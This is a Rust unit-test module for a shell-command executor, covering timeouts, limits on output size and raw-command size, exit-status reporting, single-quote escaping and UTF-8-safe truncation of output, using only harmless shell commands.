#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(unix)]
    #[test]
    fn process_timeout_terminates_child_group() {
        let result = run_process_with_timeout(
            "timeout",
            "sleep",
            Command::new("sh").args(["-c", "sleep 5"]),
            Duration::from_millis(100),
        );

        assert!(!result.success);
        assert!(result.error.contains("timed out"));
    }

    #[cfg(unix)]
    #[test]
    fn process_output_is_bounded() {
        let result = run_process(
            "output",
            "large output",
            Command::new("sh").args(["-c", "yes x | head -c 300000"]),
        );

        assert!(!result.success);
        assert!(result.error.contains("output exceeded"));
        assert!(result.output.len() <= MAX_CHARS);
    }

    #[cfg(unix)]
    #[test]
    fn process_success_and_failure_are_reported() {
        let success = run_process(
            "success",
            "printf",
            Command::new("sh").args(["-c", "printf ok"]),
        );
        assert!(success.success);
        assert_eq!(success.output, "ok");

        let failure = run_process(
            "failure",
            "exit",
            Command::new("sh").args(["-c", "printf failed >&2; exit 7"]),
        );
        assert!(!failure.success);
        assert!(failure.error.contains("failed"));
    }

    #[cfg(unix)]
    #[test]
    fn raw_shell_input_limit_is_checked_before_decode() {
        let executor = CommandExecutor::Linux;
        let encoded = general_purpose::STANDARD.encode(vec![b'x'; MAX_RAW_COMMAND_BYTES + 1]);
        let error = executor
            .run_linux_shell_raw(&encoded)
            .expect_err("oversized raw command must be rejected");
        assert!(error.to_string().contains("exceeds"));
    }

    #[test]
    fn shell_quoting_preserves_single_quotes() {
        assert_eq!(single_quote_for_sh("echo 'ok'"), "echo '\"'\"'ok'\"'\"'");
    }

    #[test]
    fn output_truncation_preserves_utf8_boundaries() {
        let input = "é".repeat(MAX_CHARS);
        let truncated = OutputFormatter::truncate(&input);
        assert!(truncated.ends_with("...[truncated]"));
        assert!(truncated.is_char_boundary(truncated.len()));
    }
}
